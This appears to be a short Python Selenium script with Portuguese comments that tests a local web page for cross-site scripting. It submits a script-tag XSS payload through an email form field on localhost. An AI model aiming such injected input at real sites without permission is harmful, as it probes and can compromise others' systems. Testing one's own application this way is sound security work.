from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
import time 

# Inicia o Chrome com driver compatível automaticamente
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

driver.get("http://localhost")

time.sleep(2)

campo = driver.find_element(By.NAME, "email")
payload = '><script>alert("XSS")</script>'
campo.send_keys(payload)
botao = driver.find_element(By.NAME, "submit")
botao.click()
time.sleep(2)

driver.quit()